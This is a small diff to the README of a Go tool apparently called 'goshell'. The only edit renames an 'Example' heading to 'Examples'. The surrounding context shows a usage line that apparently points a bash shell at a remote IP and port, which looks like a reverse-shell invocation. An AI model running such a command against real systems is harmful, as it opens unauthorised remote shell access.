@@ -25,7 +25,7 @@ GLOBAL OPTIONS:
    --help, -h  show help (default: false)
 ```
 
-## Example
+## Examples
 ```
 > ./goshell bash -ip 1.2.3.4 -port 1337                                                                                                            ~/dev/go/goshell
 GoShell - (c)2020 - ezekiel
